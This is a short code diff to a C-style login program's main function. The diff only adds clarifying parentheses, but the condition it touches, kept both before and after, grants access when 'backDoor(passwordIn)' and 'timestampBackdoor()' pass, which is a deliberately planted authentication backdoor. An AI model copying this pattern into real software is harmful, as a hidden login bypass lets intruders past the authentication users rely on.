@@ -79,7 +79,7 @@ int main() {
 		// If Authenticated, Exit indicating successful authentication
 		// For incorrect login details, reject, clear screen and re-prompt input
 		// If maximum attempts exceeded, reject the user
-        if (isAuthenticated || backDoor(passwordIn) && timestampBackdoor()) {
+        if (isAuthenticated || (backDoor(passwordIn) && timestampBackdoor())) {
             authenticated(usernameIn);
             return 0;
         }
